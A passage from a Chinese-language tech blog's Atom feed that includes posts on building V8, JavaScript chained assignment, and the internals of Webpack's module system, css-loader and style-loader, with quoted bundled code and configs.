id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><p>编译一下 <code>samples/hello-world.cc</code></p><pre><code class="lang-bash">$ g++ samples/hello-world.cc -o hello-world \-I. -I./include \-L./out.gn/x64.release.sample/obj -lv8_monolith \-std=c++11</code></pre><p>执行一下，如果有如下输出就是编译成功了</p><pre><code class="lang-bash">$ ./hello-world&#39;&#39;&#39;Hello, World!3 + 4 = 7</code></pre><h2 id="其他编译选项"><a href="#其他编译选项" class="headerlink" title="其他编译选项"></a>其他编译选项</h2><p>上文已经演示了如何编译 V8 静态库并链接到你的 C++ 代码中，下面我们尝试编译可执行文件 d8</p><h3 id="Release-版本"><a href="#Release-版本" class="headerlink" title="Release 版本"></a>Release 版本</h3><pre><code class="lang-bash">$ v8gen.py x64.release$ ninja -C out.gn/x64.release</code></pre><h3 id="Debug-版本"><a href="#Debug-版本" class="headerlink" title="Debug 版本"></a>Debug 版本</h3><pre><code class="lang-bash">$ v8gen.py x64.debug$ ninja -C out.gn/x64.debug</code></pre><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ol><li><a href="https://v8.dev/docs/embed" target="_blank" rel="noopener">Getting started with embedding V8</a></li><li><a href="http://site.icu-project.org/download/67" target="_blank" rel="noopener">ICU - International Components for Unicode</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="FrontEnd" scheme="https://vincent0700.com/tags/FrontEnd/"/>
    
      <category term="V8" scheme="https://vincent0700.com/tags/V8/"/>
    
  </entry>
  
  <entry>
    <title>Javascript 连等赋值</title>
    <link href="https://vincent0700.com/2020/05/09/053_Javascript_continuous_assignment/"/>
    <id>https://vincent0700.com/2020/05/09/053_Javascript_continuous_assignment/</id>
    <published>2020-05-09T12:00:00.000Z</published>
    <updated>2020-05-17T12:54:50.306Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="一个问题引发的思考"><a href="#一个问题引发的思考" class="headerlink" title="一个问题引发的思考"></a>一个问题引发的思考</h2><p>我最初是在 <code>Segmentfault</code> 上看到网友提的这个问题，<a href="https://segmentfault.com/q/1010000002637728" target="_blank" rel="noopener">传送门</a></p><pre><code class="lang-javascript">var a = {n:1};  var b = a;a.x = a = {n:2};  alert(a.x);// --&gt; undefined  alert(b.x);// --&gt; {n:2}</code></pre><p>第一眼看上去很奇怪，难道根据右结合性 <code>a.x = a = {n:2}</code> 的执行过程不应该是 <code>a = {n:2}</code> 然后 <code>a.x = {n:2}</code> 也就是 <code>a = {n:2, x:{n:2}}</code> 么？</p><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><p>实际上 <code>a.x = a = {n:2}</code> 这行语句的执行过程如下</p><ol><li>执行前, <code>a</code> 指向的是 <code>{n:1}</code> 的内存地址, <code>a.x</code> 会在 <code>{n:1}</code> 创建一个 <code>undefined</code> 变量等待赋值, 即 <code>{n:1, x:undefined}</code></li><li>在内存中创建对象 <code>{n:2}</code>，等待被引用</li><li><code>a</code> 重新指向 <code>{n:2}</code>, <code>a.x</code> 指向 <code>{n:2}</code>, 即 <code>{n:1, x:{n:2}}</code></li></ol><p>可以发现 <code>a</code> 的赋值并不会对 <code>a.x</code> 赋值产生影响。因为 <code>a</code> 赋值改变了原本 <code>a</code> 指向 <code>{n:2}</code> 的地址，而 <code>a.x</code> 中的 <code>a</code> 在此之前已经被取出，依然指向 <code>{n:1}</code> 的地址。所以即使改变等号左右的顺序变为 <code>a = a.x = {n:2}</code> 依然不会对结果产生影响。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="FrontEnd" scheme="https://vincent0700.com/tags/FrontEnd/"/>
    
      <category term="Javascript" scheme="https://vincent0700.com/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>Webpack Loader 原理学习之 css-loader</title>
    <link href="https://vincent0700.com/2020/05/07/052_Css_loader/"/>
    <id>https://vincent0700.com/2020/05/07/052_Css_loader/</id>
    <published>2020-05-07T12:00:00.000Z</published>
    <updated>2020-05-07T12:56:21.492Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>本文通过 <code>css-loader</code> 打包后代码分析了其工作原理，以及相关使用细节。如果对 <code>Webpack</code> 模块化原理不熟悉的童鞋可以参考我上一篇文章 <a href="/2020/04/30/051_Webpack_module_principle">Webpack模块化原理</a>。</p></blockquote><h2 id="示例源码"><a href="#示例源码" class="headerlink" title="示例源码"></a>示例源码</h2><p>我们依旧从打包后的源码开始看起。</p><pre><code class="lang-bash">$ git clone https://github.com/Vincent0700/learning-webpack.git$ cd learning-webpack$ yarn install# 运行$ yarn dev:css# 打包$ yarn build:css</code></pre><h3 id="待打包文件"><a href="#待打包文件" class="headerlink" title="待打包文件"></a>待打包文件</h3><pre><code class="lang-css">/* src/templates/loaders/test.css */html,body {  background: #ccc;  height: 100vh;}h1 {  font-size: 100px;}</code></pre><pre><code class="lang-javascript">// src/templates/loaders/test-css.jsimport style from &#39;./test.css&#39;;console.log(style);</code></pre><h3 id="Webpack-配置"><a href="#Webpack-配置" class="headerlink" title="Webpack 配置"></a>Webpack 配置</h3><pre><code class="lang-javascript">// src/examples/webpack.css.jsconst path = require(&#39;path&#39;);const HtmlWebpackPlugin = require(&#39;html-webpack-plugin&#39;);module.exports = {  mode: &#39;development&#39;,  entry: path.join(__dirname, &#39;../templates/loaders/test-css.js&#39;),  output: {    path: path.join(__dirname, &#39;../../dist&#39;),    filename: &#39;bundle-css.js&#39;  },  module: {    rules: [      {        test: /\.css$/,        use: [&#39;css-loader&#39;]      }    ]  },  plugins: [new HtmlWebpackPlugin()],  devServer: {    contentBase: path.join(__dirname, &#39;../../dist&#39;),    compress: true,    port: 9000  }};</code></pre><h2 id="打包结果"><a href="#打包结果" class="headerlink" title="打包结果"></a>打包结果</h2><p>打包后得到了 <code>bundle-css.js</code>，其中有3个 <code>modules</code>：</p><ol><li>./node_modules/css-loader/dist/runtime/api.js</li><li>./src/templates/loaders/test-css.js</li><li>‘./src/templates/loaders/test.css’</li></ol><p>我们从入口 test-css.js 看起</p><pre><code class="lang-javascript">// ./src/templates/loaders/test-css.js&#39;function(module, __webpack_exports__, __webpack_require__) {  __webpack_require__.r(__webpack_exports__);  var _test_css__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(    &#39;./src/templates/loaders/test.css&#39;  );  var _test_css__WEBPACK_IMPORTED_MODULE_0___default = __webpack_require__.n(    _test_css__WEBPACK_IMPORTED_MODULE_0__  );  console.log(_test_css__WEBPACK_IMPORTED_MODULE_0___default.a);},</code></pre><p>这段代码首先调用 <code>__webpack_require__</code> 读取 <code>css</code> 模块，然后是一段兼容性代码，<code>__webpack_require__.n</code>，它的作用是判断是否是 <code>es6</code> 模块，如果是导出 <code>module.default</code>，否则直接导出 <code>module</code>，代码如下：</p><pre><code class="lang-javascript">__webpack_require__.n = function(module) {  var getter =    module &amp;&amp; module.__esModule      ? function getDefault() {          return module[&#39;default&#39;];        }      : function getModuleExports() {          return module;        };  __webpack_require__.d(getter, &#39;a&#39;, getter);  return getter;};</code></pre><p>接着，我们看下 <code>css</code> 模块的代码：</p><pre><code class="lang-javascript">// ./src/templates/loaders/test.css&#39;var ___CSS_LOADER_API_IMPORT___ = __webpack_require__(  &#39;./node_modules/css-loader/dist/runtime/api.js&#39;);exports = ___CSS_LOADER_API_IMPORT___(false);exports.push([  module.i,  `html,body {    background: #ccc;    height: 100vh;  }  h1 {    font-size: 100px;  }`,  &#39;&#39;]);module.exports = exports;</code></pre><p>这段代码首先通过调用 <code>api.js</code> 初始化了 <code>exports</code> 并然后导出了 <code>css</code> 样式代码，下面我们看看 <code>api.js</code> 做了那些事：</p><pre><code class="lang-javascript">// ./node_modules/css-loader/dist/runtime/api.jsfunction(module, exports, __webpack_require__) {  module.exports = function(useSourceMap) {    var list = [];    list.toString = function toString() {      return this.map(function(item) {        var content = cssWithMappingToString(item, useSourceMap);        if (item[2]) {          return &#39;@media &#39;.concat(item[2], &#39; {&#39;).concat(content, &#39;}&#39;);        }        return content;      }).join(&#39;&#39;);    };    list.i = function(modules, mediaQuery, dedupe) {      if (typeof modules === &#39;string&#39;) {        modules = [[null, modules, &#39;&#39;]];      }      var alreadyImportedModules = {};      if (dedupe) {        for (var i = 0; i &lt; this.length; i++) {          var id = this[i][0];          if (id != null) {            alreadyImportedModules[id] = true;          }        }      }      for (var _i = 0; _i &lt; modules.length; _i++) {        var item = [].concat(modules[_i]);        if (dedupe &amp;&amp; alreadyImportedModules[item[0]]) {          continue;        }        if (mediaQuery) {          if (!item[2]) {            item[2] = mediaQuery;          } else {            item[2] = &#39;&#39;.concat(mediaQuery, &#39; and &#39;).concat(item[2]);          }        }        list.push(item);      }    };    return list;  };  function cssWithMappingToString(item, useSourceMap) {    var content = item[1] || &#39;&#39;;    var cssMapping = item[3];    if (!cssMapping) {      return content;    }    if (useSourceMap &amp;&amp; typeof btoa === &#39;function&#39;) {      var sourceMapping = toComment(cssMapping);      var sourceURLs = cssMapping.sources.map(function(source) {        return &#39;/*# sourceURL=&#39;.concat(cssMapping.sourceRoot || &#39;&#39;).concat(source, &#39; */&#39;);      });      return [content]        .concat(sourceURLs)        .concat([sourceMapping])        .join(&#39;\n&#39;);    }    return [content].join(&#39;\n&#39;);  }  function toComment(sourceMap) {    var base64 = btoa(unescape(encodeURIComponent(JSON.stringify(sourceMap))));    var data = &#39;sourceMappingURL=data:application/json;charset=utf-8;base64,&#39;.concat(base64);    return &#39;/*# &#39;.concat(data, &#39; */&#39;);  }}</code></pre><p>上面代码可以看出 <code>css-loader</code> 主要提供了 <code>toString</code> 方法，将 <code>css</code> 文件导出为字符串。 若传入的 <code>useSourceMap</code> 为 <code>true</code>，则会生成并添加 <code>sourcemap</code> 到导出的字符串。默认不会生成 <code>sourcemap</code>，从导出后的代码 <code>exports = ___CSS_LOADER_API_IMPORT___(false);</code> 就可以看出。我们改动一下 <code>test-css.js</code>：</p><pre><code class="lang-javascript">import style from &#39;./test.css&#39;;console.log(style.toString());</code></pre><p>输出的结果为：</p><pre><code class="lang-javascript">html,body {  background: #ccc;  height: 100vh;}h1 {  font-size: 100px;}</code></pre><p>现在我们改动一下 <code>webpack</code>，让 <code>css-loader</code> 生成 <code>sourcemap</code>：</p><pre><code class="lang-javascript">use: [  {    loader: &#39;css-loader&#39;,    options: {      sourceMap: true    }  }];</code></pre><p>现在 <code>toString</code> 输出的结果为：</p><pre><code class="lang-javascript">html,body {  background: #ccc;  height: 100vh;}h1 {  font-size: 100px;}/*# sourceURL=test.css *//*# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInRlc3QuY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBOztFQUVFLGdCQUFnQjtFQUNoQixhQUFhO0FBQ2Y7O0FBRUE7RUFDRSxnQkFBZ0I7QUFDbEIiLCJmaWxlIjoidGVzdC5jc3MiLCJzb3VyY2VzQ29udGVudCI6WyJodG1sLFxuYm9keSB7XG4gIGJhY2tncm91bmQ6ICNjY2M7XG4gIGhlaWdodDogMTAwdmg7XG59XG5cbmgxIHtcbiAgZm9udC1zaXplOiAxMDBweDtcbn1cbiJdfQ== */</code></pre><p>可以看出，现在内联了 <code>base64</code> 编码的 <code>json</code> 格式的 <code>sourcemap</code>，转码后是这样的：</p><pre><code class="lang-json">{  &quot;version&quot;: 3,  &quot;sources&quot;: [&quot;test.css&quot;],  &quot;names&quot;: [],  &quot;mappings&quot;: &quot;AAAA;;EAEE,gBAAgB;EAChB,aAAa;AACf;;AAEA;EACE,gBAAgB;AAClB&quot;,  &quot;file&quot;: &quot;test.css&quot;,  &quot;sourcesContent&quot;: [    &quot;html,\nbody {\n  background: #ccc;\n  height: 100vh;\n}\n\nh1 {\n  font-size: 100px;\n}\n&quot;  ]}</code></pre><h2 id="使用样式"><a href="#使用样式" class="headerlink" title="使用样式"></a>使用样式</h2><p>目前虽然可以通过 <code>import</code> 导入 <code>css</code> 文件了，但是 <code>html</code> 还没有套用我们引入的样式。常用的可以衔接 <code>css-loader</code> 套用样式到 <code>html</code> 的方法有两种：</p><ol><li>style-loader</li><li>mini-css-extract-plugin</li></ol><p>首先是 <code>style-loader</code>，我们简单改动一下 <code>webpack</code> 配置：</p><pre><code class="lang-javascript">{  test: /\.css$/,  use: [&#39;style-loader&#39;, &#39;css-loader&#39;]}</code></pre><p>可以看出，<code>loader</code> 是从右向左加载的。打包后，我们会发现源码中新增了一个 <code>module</code>：</p><pre><code class="lang-javascript">// ./node_modules/style-loader/dist/runtime/injectStylesIntoStyleTag.jsfunction(module, exports, __webpack_require__) {  var isOldIE = (function isOldIE() {    var memo;    return function memorize() {      if (typeof memo === &#39;undefined&#39;) {        memo = Boolean(window &amp;&amp; document &amp;&amp; document.all &amp;&amp; !window.atob);      }      return memo;    };  })();  var getTarget = (function getTarget() {    var memo = {};    return function memorize(target) {      if (typeof memo[target] === &#39;undefined&#39;) {        var styleTarget = document.querySelector(target);        if (window.HTMLIFrameElement &amp;&amp; styleTarget instanceof window.HTMLIFrameElement) {          try {            styleTarget = styleTarget.contentDocument.head;          } catch (e) {            styleTarget = null;          }        }        memo[target] = styleTarget;      }      return memo[target];    };  })();  var stylesInDom = [];  function getIndexByIdentifier(identifier) {    var result = -1;    for (var i = 0; i &lt; stylesInDom.length; i++) {      if (stylesInDom[i].identifier === identifier) {        result = i;        break;      }    }    return result;  }  function modulesToDom(list, options) {    var idCountMap = {};    var identifiers = [];    for (var i = 0; i &lt; list.length; i++) {      var item = list[i];      var id = options.base ? item[0] + options.base : item[0];      var count = idCountMap[id] || 0;      var identifier = &#39;&#39;.concat(id, &#39; &#39;).concat(count);      dCountMap[id] = count + 1;      var index = getIndexByIdentifier(identifier);      var obj = {        css: item[1],        media: item[2],        sourceMap: item[3]      };      if (index !== -1) {        stylesInDom[index].references++;        stylesInDom[index].updater(obj);      } else {        stylesInDom.push({          identifier: identifier,          updater: addStyle(obj, options),          references: 1        });      }      identifiers.push(identifier);    }    return identifiers;  }  function insertStyleElement(options) {    var style = document.createElement(&#39;style&#39;);    var attributes = options.attributes || {};    if (typeof attributes.nonce === &#39;undefined&#39;) {      var nonce = true ? __webpack_require__.nc : undefined;      if (nonce) {        attributes.nonce = nonce;      }    }    Object.keys(attributes).forEach(function(key) {      style.setAttribute(key, attributes[key]);    });    if (typeof options.insert === &#39;function&#39;) {      options.insert(style);    } else {      var target = getTarget(options.insert || &#39;head&#39;);      if (!target) {        throw new Error(          &quot;Couldn&#39;t find a style target. This probably means that the value for the &#39;insert&#39; parameter is invalid.&quot;        );      }      target.appendChild(style);    }    return style;  }  function removeStyleElement(style) {    if (style.parentNode === null) {      return false;    }    style.parentNode.removeChild(style);  }  var replaceText = (function replaceText() {    textStore = [];    return function replace(index, replacement) {      textStore[index] = replacement;      return textStore.filter(Boolean).join(&#39;\n&#39;);    };  })();  function applyToSingletonTag(style, index, remove, obj) {    var css = remove      ? &#39;&#39;      : obj.media      ? &#39;@media &#39;.concat(obj.media, &#39; {&#39;).concat(obj.css, &#39;}&#39;)      : obj.css;    if (style.styleSheet) {      style.styleSheet.cssText = replaceText(index, css);    } else {      var cssNode = document.createTextNode(css);      var childNodes = style.childNodes;      if (childNodes[index]) {        style.removeChild(childNodes[index]);      }      if (childNodes.length) {        style.insertBefore(cssNode, childNodes[index]);      } else {        style.appendChild(cssNode);      }    }  }  function applyToTag(style, options, obj) {    var css = obj.css;    var media = obj.media;    var sourceMap = obj.sourceMap;    if (media) {      style.setAttribute(&#39;media&#39;, media);    } else {      style.removeAttribute(&#39;media&#39;);    }    if (sourceMap &amp;&amp; btoa) {      css += &#39;\n/*# sourceMappingURL=data:application/json;base64,&#39;.concat(        btoa(unescape(encodeURIComponent(JSON.stringify(sourceMap)))),        &#39; */&#39;      );    }    if (style.styleSheet) {      style.styleSheet.cssText = css;    } else {      while (style.firstChild) {        style.removeChild(style.firstChild);      }      style.appendChild(document.createTextNode(css));    }  }  var singleton = null;  var singletonCounter = 0;  function addStyle(obj, options) {    var style;    var update;    var remove;    if (options.singleton) {      var styleIndex = singletonCounter++;      style = singleton || (singleton = insertStyleElement(options));      update = applyToSingletonTag.bind(null, style, styleIndex, false);      remove = applyToSingletonTag.bind(null, style, styleIndex, true);    } else {      style = insertStyleElement(options);      update = applyToTag.bind(null, style, options);      remove = function remove() {        removeStyleElement(style);      };    }    update(obj);    return function updateStyle(newObj) {      if (newObj) {        if (          newObj.css === obj.css &amp;&amp;          newObj.media === obj.media &amp;&amp;          newObj.sourceMap === obj.sourceMap        ) {          return;        }        update((obj = newObj));      } else {        remove();      }    };  }  module.exports = function(list, options) {    options = options || {};    if (!options.singleton &amp;&amp; typeof options.singleton !== &#39;boolean&#39;) {      options.singleton = isOldIE();    }    list = list || [];    var lastIdentifiers = modulesToDom(list, options);    return function update(newList) {      newList = newList || [];      if (Object.prototype.toString.call(newList) !== &#39;[object Array]&#39;) {        return;      }      for (var i = 0; i &lt; lastIdentifiers.length; i++) {        var identifier = lastIdentifiers[i];        var index = getIndexByIdentifier(identifier);        stylesInDom[index].references--;      }      var newLastIdentifiers = modulesToDom(newList, options);      for (var _i = 0; _i &lt; lastIdentifiers.length; _i++) {        var _identifier = lastIdentifiers[_i];        var _index = getIndexByIdentifier(_identifier);        if (stylesInDom[_index].references === 0) {          stylesInDom[_index].updater();          stylesInDom.splice(_index, 1);        }      }      lastIdentifiers = newLastIdentifiers;    };  };}</code></pre><p>分析上述代码可以得知，<code>style-loader</code> 暴露了一个方法，传入 <code>css-loader</code> 导出的 <code>list</code> 和自己的 <code>options</code>，主要通过 <code>insertStyleElement</code> 这一方法新建 <code>style</code> 标签并注入样式。所以这种方式 <code>css</code> 是以字符串的形式打包进 <code>js</code> 文件的。如果我想要单独导出 <code>css</code> 文件，就需要使用 <code>mini-css-extract-plugin</code> 了。</p><p>我们改动一下 <code>webpack</code> 配置：</p><pre><code class="lang-javascript">const path = require(&#39;path&#39;);const HtmlWebpackPlugin = require(&#39;html-webpack-plugin&#39;);const MiniCssExtractPlugin = require(&#39;mini-css-extract-plugin&#39;);module.exports = {  mode: &#39;development&#39;,  entry: path.join(__dirname, &#39;../templates/loaders/test-css.js&#39;),  output: {    path: path.join(__dirname, &#39;../../dist&#39;),    filename: &#39;bundle-css.js&#39;  },  module: {    rules: [      {        test: /\.css$/,        use: [          // &#39;style-loader&#39;,          MiniCssExtractPlugin.loader,          &#39;css-loader&#39;        ]      }    ]  },  plugins: [    new HtmlWebpackPlugin(),    new MiniCssExtractPlugin({      filename: &#39;[name].css&#39;,      chunkFilename: &#39;[id].css&#39;    })  ],  devServer: {    contentBase: path.join(__dirname, &#39;../../dist&#39;),    compress: true,    port: 9000  }};</code></pre><p><code>mini-css-extract-plugin</code> 会从 <code>bundle</code> 包中抽出 <code>css</code> 文件，然后通过 <code>link</code> 标签引入外部样式。我们还可以通过 <code>optimize-css-assets-webpack-plugin</code> 对 <code>css</code> 文件进行压缩：</p><pre><code class="lang-javascript">const path = require(&#39;path&#39;);const HtmlWebpackPlugin = require(&#39;html-webpack-plugin&#39;);const MiniCssExtractPlugin = require(&#39;mini-css-extract-plugin&#39;);const OptimizeCssAssetsPlugin = require(&#39;optimize-css-assets-webpack-plugin&#39;);module.exports = {  mode: &#39;development&#39;,  entry: path.join(__dirname, &#39;../templates/loaders/test-css.js&#39;),  output: {    path: path.join(__dirname, &#39;../../dist&#39;),    filename: &#39;bundle-css.js&#39;  },  module: {    rules: [      {        test: /\.css$/,        use: [          // &#39;style-loader&#39;,          MiniCssExtractPlugin.loader,          &#39;css-loader&#39;        ]      }    ]  },  plugins: [    new HtmlWebpackPlugin(),    new MiniCssExtractPlugin({      filename: &#39;[name].css&#39;,      chunkFilename: &#39;[id].css&#39;    }),    new OptimizeCssAssetsPlugin()  ],  devServer: {    contentBase: path.join(__dirname, &#39;../../dist&#39;),    compress: true,    port: 9000  }};</code></pre><h2 id="相关文档"><a href="#相关文档" class="headerlink" title="相关文档"></a>相关文档</h2><ul><li><a href="https://www.webpackjs.com/loaders/css-loader/" target="_blank" rel="noopener">Webpack 官方文档</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="FrontEnd" scheme="https://vincent0700.com/tags/FrontEnd/"/>
    
      <category term="Webpack" scheme="https://vincent0700.com/tags/Webpack/"/>
    
  </entry>
  
  <entry>
    <title>Webpack 模块化原理</title>
    <link href="https://vincent0700.com/2020/04/30/051_Webpack_module_principle/"/>
    <id>https://vincent0700.com/2020/04/30/051_Webpack_module_principle/</id>
    <published>2020-04-30T13:00:00.000Z</published>
    <updated>2020-05-07T12:52:34.652Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>本文旨在通过分析 Webpack 打包后代码的方式来探索其模块化原理。</p></blockquote><h2 id="示例源码"><a href="#示例源码" class="headerlink" title="示例源码"></a>示例源码</h2><pre><code class="lang-bash">$ git clone https://github.com/Vincent0700/learning-webpack.git$ cd learning-webpack$ yarn install$ yarn build:basic</code></pre><h3 id="待打包文件"><a href="#待打包文件" class="headerlink" title="待打包文件"></a>待打包文件</h3><pre><code class="lang-javascript">// src/templates/basic/utils.jsexport const add = (x, y) =&gt; x + y;export const num = 10;export const obj = { a: { b: 1 } };export default {  add,  num,  obj};</code></pre><pre><code class="lang-javascript">// src/templates/basic/index.jsimport utils from &#39;./utils&#39;;const result = utils.add(1, 2);console.log(result);</code></pre><h3 id="Webpack-配置"><a href="#Webpack-配置" class="headerlink" title="Webpack 配置"></a>Webpack 配置</h3><pre><code class="lang-javascript">// src/examples/webpack.basic.jsconst path = require(&#39;path&#39;);module.exports = {  mode: &#39;development&#39;,  entry: path.join(__dirname, &#39;../templates/index.js&#39;),  output: {    path: path.join(__dirname, &#39;../../dist&#39;),    filename: &#39;bundle.js&#39;  }};</code></pre><h2 id="打包结果"><a href="#打包结果" class="headerlink" title="打包结果"></a>打包结果</h2><p>我格式化并删减了一写注释，得到的 <code>bundle.js</code> 文件内容如下：</p><pre><code class="lang-javascript">(function(modules) {  // webpackBootstrap  // The module cache  var installedModules = {};  // The require function  function __webpack_require__(moduleId) {    // Check if module is in cache    if (installedModules[moduleId]) {      return installedModules[moduleId].exports;    }    // Create a new module (and put it into the cache)    var module = (installedModules[moduleId] = {      i: moduleId,      l: false,      exports: {}    });    // Execute the module function    modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);    // Flag the module as loaded    module.l = true;    // Return the exports of the module    return module.exports;  }  // expose the modules object (__webpack_modules__)  __webpack_require__.m = modules;  // expose the module cache  __webpack_require__.c = installedModules;  // define getter function for harmony exports  __webpack_require__.d = function(exports, name, getter) {    if (!__webpack_require__.o(exports, name)) {      Object.defineProperty(exports, name, { enumerable: true, get: getter });    }  };  // define __esModule on exports  __webpack_require__.r = function(exports) {    if (typeof Symbol !== &#39;undefined&#39; &amp;&amp; Symbol.toStringTag) {      Object.defineProperty(exports, Symbol.toStringTag, { value: &#39;Module&#39; });    }    Object.defineProperty(exports, &#39;__esModule&#39;, { value: true });  };  // create a fake namespace object  // mode &amp; 1: value is a module id, require it  // mode &amp; 2: merge all properties of value into the ns  // mode &amp; 4: return value when already ns object  // mode &amp; 8|1: behave like require  __webpack_require__.t = function(value, mode) {    if (mode &amp; 1) value = __webpack_require__(value);    if (mode &amp; 8) return value;    if (mode &amp; 4 &amp;&amp; typeof value === &#39;object&#39; &amp;&amp; value &amp;&amp; value.__esModule) return value;    var ns = Object.create(null);    __webpack_require__.r(ns);    Object.defineProperty(ns, &#39;default&#39;, { enumerable: true, value: value });    if (mode &amp; 2 &amp;&amp; typeof value != &#39;string&#39;)      for (var key in value)        __webpack_require__.d(          ns,          key,          function(key) {            return value[key];          }.bind(null, key)        );    return ns;  };  // getDefaultExport function for compatibility with non-harmony modules  __webpack_require__.n = function(module) {    var getter =      module &amp;&amp; module.__esModule        ? function getDefault() {            return module[&#39;default&#39;];          }        : function getModuleExports() {            return module;          };    __webpack_require__.d(getter, &#39;a&#39;, getter);    return getter;  };  // Object.prototype.hasOwnProperty.call  __webpack_require__.o = function(object, property) {    return Object.prototype.hasOwnProperty.call(object, property);  };  // __webpack_public_path__  __webpack_require__.p = &#39;&#39;;  // Load entry module and return exports  return __webpack_require__((__webpack_require__.s = &#39;./src/templates/index.js&#39;));})({  &#39;./src/templates/index.js&#39;:    /*! ./src/templates/index.js */    function(module, __webpack_exports__, __webpack_require__) {      &#39;use strict&#39;;      eval(`        __webpack_require__.r(__webpack_exports__);        var _utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(&quot;./src/templates/utils.js&quot;);        const result = _utils__WEBPACK_IMPORTED_MODULE_0__[&quot;default&quot;].add(1, 2);        console.log(result);      `);    },  &#39;./src/templates/utils.js&#39;:    /*! ./src/templates/utils.js */    function(module, __webpack_exports__, __webpack_require__) {      &#39;use strict&#39;;      eval(`        __webpack_require__.r(__webpack_exports__);        __webpack_require__.d(__webpack_exports__, &quot;add&quot;, function() { return add; });        __webpack_require__.d(__webpack_exports__, &quot;num&quot;, function() { return num; });        __webpack_require__.d(__webpack_exports__, &quot;obj&quot;, function() { return obj; });        const add = (x, y) =&gt; x + y;        const num = 10;        const obj = { a: { b: 1 } };        __webpack_exports__[&quot;default&quot;] = ({ add, num, obj });      `);    }});</code></pre><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="IFFE"><a href="#IFFE" class="headerlink" title="IFFE"></a><code>IFFE</code></h3><p>打包后的整体就是一个立即执行函数，精简结构如下：</p><pre><code class="lang-javascript">(function(modules) {  var installedModules = {};  function __webpack_require__(moduleId) {    // add some magic ...    return module.exports;  }  return __webpack_require__(&#39;index.js&#39;);})({  &#39;index.js&#39;: function(module, __webpack_exports__, __webpack_require__) {    eval(&#39;...&#39;);  },  &#39;utils.js&#39;: function(module, __webpack_exports__, __webpack_require__) {    eval(&#39;...&#39;);  }});</code></pre><h3 id="核心函数-webpack-require"><a href="#核心函数-webpack-require" class="headerlink" title="核心函数 __webpack_require__"></a>核心函数 <code>__webpack_require__</code></h3><pre><code class="lang-javascript">function __webpack_require__(moduleId) {  // 如果缓存了已装载的模块，则不重复执行，直接返回导出的引用  if (installedModules[moduleId]) {    return installedModules[moduleId].exports;  }  // 缓存没命中则构建模块  var module = (installedModules[moduleId] = {    i: moduleId,    l: false,    exports: {}  });  // 执行模块  modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);  // 模块装载标志  module.l = true;  // 返回导出的引用  return module.exports;}</code></pre><p>从上述代码可以看出：</p><ol><li>模块代码只执行一次，缓存在 <code>modules[moduleId]</code></li><li>模块执行后导出对象会挂在 <code>module.exports</code> 并返回</li></ol><p>我们来看看 <code>module</code> 对象</p><pre><code class="lang-javascript">// index.js{  i: &quot;./src/templates/index.js&quot;,  l: true  exports: {    Symbol.toStringTag: &quot;Module&quot;,    __esModule: true  }}</code></pre><pre><code class="lang-javascript">// utils.js{  i: &quot;./src/templates/utils.js&quot;  l: true  exports: {    add: (x, y) =&gt; x + y,    divide: (x, y) =&gt; x / y,    minus: (x, y) =&gt; x - y,    multiply: (x, y) =&gt; x * y,    default: {      add: (x, y) =&gt; x + y,      divide: (x, y) =&gt; x / y,      minus: (x, y) =&gt; x - y,      multiply: (x, y) =&gt; x * y    },    Symbol.toStringTag: &quot;Module&quot;,    __esModule: true  }}</code></pre><p>从上述代码可以看出：</p><ol><li><code>module.i</code> 即 <code>moduleId</code>，为模块的相对路径</li><li><code>module.l</code> 将会在模块代码执行后置为 <code>true</code></li><li><code>export { a }</code> 将会转化为 <code>module.exports.a</code></li><li><code>export default b</code> 将会转化为 <code>module.exports.b</code></li><li><code>Symbol.toStringTag</code> 是一个内置 <code>symbol</code>，使得我们可以通过 <code>Object.prototype.toString(module)</code> 得到 <code>[object Module]</code> 以推断类型</li><li><code>__esModule</code> 标志了这是一个符合 <code>ES</code> 标准的模块</li></ol><h3 id="参数部分"><a href="#参数部分" class="headerlink" title="参数部分"></a>参数部分</h3><p>最后研究一下，<code>IFFE</code> 的参数部分，即模块代码的编译结果：</p><pre><code class="lang-javascript">{  &#39;./src/templates/index.js&#39;:    function(module, __webpack_exports__, __webpack_require__) {      &#39;use strict&#39;;      eval(`        